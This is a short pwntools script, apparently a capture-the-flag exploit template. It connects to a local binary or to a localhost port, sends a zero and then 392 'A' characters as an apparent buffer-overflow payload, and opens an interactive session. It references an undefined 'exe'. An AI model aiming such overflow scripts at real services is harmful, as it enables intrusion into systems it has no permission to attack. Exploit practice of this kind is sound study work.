#!/usr/bin/env python3

from pwn import *


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.DEBUG:
			gdb.attach(r)
	else:
		r = remote("127.0.0.1", 9999)

	return r


def main():
	r = conn()

	# good luck pwning :)
	r.sendline(str(0))
	r.sendline("A"*392)

	r.interactive()


if __name__ == "__main__":
	main()

